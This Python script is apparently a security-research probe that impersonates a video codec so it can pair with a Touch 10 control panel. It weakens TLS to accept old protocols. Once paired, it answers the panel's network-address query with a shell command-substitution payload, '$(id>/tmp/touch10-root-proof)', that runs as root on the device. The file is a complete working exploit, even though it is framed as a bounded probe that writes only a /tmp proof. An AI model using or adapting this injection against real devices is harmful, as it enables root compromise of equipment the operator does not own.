#!/usr/bin/env python3
"""Bounded fake-codec pairing probe for the owner's isolated Touch 10.

This mode completes pairing and can cause persistent changes on the panel.
It offers the exact installed version, no upgrade method or URL, and responds
only to the older protocol's network-address query with a /tmp-only id proof.
It never serves software or accepts arbitrary host commands.
"""

import argparse
from datetime import datetime, timezone
import json
from pathlib import Path
import select
import socket
import ssl
import subprocess
import tempfile
import time


VERSION_INFO = b"version: ce9.9.0 46f7ea38fda 2019-10-10\nmethod: none\n"
PAIRING_REQUEST = b"\x00\x03\x00\x00"
PAIRING_SUCCESS = b"\x00\x06\x00\x01\x01"
ADDRESS_QUERY = b"systemtools network addrs"
PROOF_REPLY = b"OK\n$(id>/tmp/touch10-root-proof)\nOK\n"


def recv_exact(connection, length):
    data = bytearray()
    while len(data) < length:
        chunk = connection.recv(length - len(data))
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host-ip", default="10.77.10.1")
    parser.add_argument("--target-ip", default="10.77.10.10")
    parser.add_argument("--seconds", type=int, default=300)
    parser.add_argument("--log", type=Path, required=True)
    parser.add_argument("--accept-pairing", action="store_true",
                        help="required acknowledgement that the Touch may write pairing configuration")
    args = parser.parse_args()
    if not args.accept_pairing:
        parser.error("--accept-pairing is required for this persistent-state probe")
    if not 1 <= args.seconds <= 900:
        parser.error("--seconds must be 1..900")
    for address in (args.host_ip, args.target_ip):
        socket.inet_aton(address)

    events = []
    paired_reply_sent = False
    proof_reply_sent = False
    with tempfile.TemporaryDirectory(prefix="touch10-codec-") as directory:
        certificate = Path(directory) / "certificate.pem"
        private_key = Path(directory) / "private-key.pem"
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
             "-keyout", str(private_key), "-out", str(certificate), "-days", "1",
             "-subj", "/CN=Touch10 local test codec"],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.minimum_version = ssl.TLSVersion.TLSv1
        context.set_ciphers("DEFAULT:@SECLEVEL=0")
        context.load_cert_chain(str(certificate), str(private_key))

        listeners = []
        try:
            for port in (4045, 4053, 4051):
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                listener.bind((args.host_ip, port))
                listener.listen(2)
                listeners.append(listener)
            print("Test codec listening on 4045, 4053, 4051; no software service", flush=True)
            deadline = time.monotonic() + args.seconds
            while time.monotonic() < deadline:
                ready, _, _ = select.select(listeners, [], [],
                                            min(0.5, deadline - time.monotonic()))
                for listener in ready:
                    connection, peer = listener.accept()
                    with connection:
                        port = listener.getsockname()[1]
                        if peer[0] != args.target_ip:
                            events.append({"kind": "ignored_peer", "port": port})
                            continue
                        if port == 4045:
                            connection.sendall(VERSION_INFO)
                            kind = "same_version_no_package"
                        else:
                            connection.settimeout(5)
                            try:
                                with context.wrap_socket(connection, server_side=True) as tls:
                                    if port == 4053:
                                        request = recv_exact(tls, 4)
                                        if request == PAIRING_REQUEST and not paired_reply_sent:
                                            tls.sendall(PAIRING_SUCCESS)
                                            paired_reply_sent = True
                                            kind = "pairing_success_sent"
                                        else:
                                            kind = "unexpected_pairing_request"
                                    else:
                                        request = tls.recv(4096)
                                        if (paired_reply_sent and not proof_reply_sent and
                                            ADDRESS_QUERY in request):
                                            tls.sendall(PROOF_REPLY)
                                            proof_reply_sent = True
                                            kind = "tmp_only_root_proof_reply_sent"
                                        else:
                                            kind = "other_session_request"
                                    events.append({
                                        "utc": datetime.now(timezone.utc).isoformat(),
                                        "kind": kind, "port": port,
                                        "tls_version": tls.version(),
                                        "request_bytes": len(request),
                                    })
                            except (OSError, ssl.SSLError) as error:
                                events.append({
                                    "utc": datetime.now(timezone.utc).isoformat(),
                                    "kind": "tls_error", "port": port,
                                    "error_type": type(error).__name__,
                                    "error": str(error)[:200],
                                })
                            print(json.dumps(events[-1]), flush=True)
                            continue
                        events.append({"utc": datetime.now(timezone.utc).isoformat(),
                                       "kind": kind, "port": port})
                        print(json.dumps(events[-1]), flush=True)
                if proof_reply_sent:
                    # Keep the listener briefly for logs, but do not send any more
                    # pairing or query replies.
                    deadline = min(deadline, time.monotonic() + 5)
        finally:
            for listener in listeners:
                listener.close()
            args.log.parent.mkdir(parents=True, exist_ok=True)
            args.log.write_text(json.dumps({
                "host_ip": args.host_ip, "target_ip": args.target_ip,
                "seconds": args.seconds, "events": events,
                "pairing_success_sent": paired_reply_sent,
                "tmp_only_root_proof_reply_sent": proof_reply_sent,
                "software_package_served": False,
            }, indent=2) + "\n")
    print(f"Probe complete: pairing_reply={paired_reply_sent}, proof_reply={proof_reply_sent}", flush=True)


if __name__ == "__main__":
    main()
